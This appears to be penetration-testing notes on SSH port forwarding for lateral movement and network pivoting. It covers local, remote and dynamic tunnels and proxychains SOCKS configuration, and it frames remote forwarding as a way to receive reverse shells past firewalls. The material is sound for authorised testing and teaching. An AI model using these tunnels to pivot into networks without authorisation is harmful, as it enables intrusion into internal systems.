Port forwarding is a technique that redirects network traffic through an SSH tunnel, allowing access to services that are not directly reachable from the attacker machine. It is commonly used during lateral movement and network pivoting.

---

## Local Port Forwarding

Local port forwarding exposes a port on the attacker machine and forwards traffic through the SSH connection to a service reachable from the pivot host.

This is useful when a service is only accessible from the compromised machine or its internal network.

```bash
ssh -N -L 0.0.0.0:[attacker_port]:[target_host]:[target_port] user@pivot_host
```


### Forwarding Multiple Ports

Multiple tunnels can be created in a single SSH session.

```bash
ssh -L [port1]:[host1]:[service1] \
    -L [port2]:[host2]:[service2] \
    user@pivot_host
```

---

## Remote Port Forwarding

Remote port forwarding exposes a port on the pivot host and forwards incoming connections back to the attacker machine.

This is typically used to receive reverse shells or expose local services.

```bash
ssh -N -R 127.0.0.1:[attacker_port]:[pivot_host]:[pivot_port] user@attacker_host
```

> Local port forwarding lets the attacker reach internal services through the pivot, while remote port forwarding exposes an attacker-controlled service to the pivot network. This is especially useful when firewalls block inbound connections but allow outbound traffic, enabling the pivot to initiate the tunnel back to the attacker.

---

## Dynamic Port Forwarding

Dynamic port forwarding creates a SOCKS proxy on the attacker machine. Tools can route traffic through this proxy to reach internal networks.

```bash
ssh -N -D 127.0.0.1:[socks_port] user@pivot_host
```


### Proxy Configuration

To route tools through the tunnel, a proxy-aware wrapper such as **proxychains** can be used.

> The forwarding  works because client tools like Proxychains wrap outbound connections in SOCKS protocol headers. These headers tell the SOCKS server (in this case, OpenSSH) where to send the traffic. Without them, the server can’t forward the packets correctly.

Add the SOCKS proxy to the configuration file. If the <pivot_host> is the attacker machine, you can use localhost (127.0.0.1). Otherwise, replace it with the pivot host IP.

```bash
/etc/proxychains.conf

socks5 127.0.0.1 [attacker_socks_port]
```


---

## Remote Dynamic Port Forwarding

Remote dynamic port forwarding creates a SOCKS proxy on the attacker machine, but the SSH connection is initiated from the pivot host. This allows full network pivoting even when the attacker cannot directly reach the pivot.

Unlike classic remote port forwarding (one port per tunnel), this provides dynamic routing to any host and port reachable from the pivot.

```bash
ssh -N -R [socks_port] attacker@<attacker_ip>
```

This binds a SOCKS proxy on the attacker machine at:

```text
127.0.0.1:9998
```


### Proxy configuration

```bash
/etc/proxychains.conf

socks5 127.0.0.1 [attacker_socks_port]
```
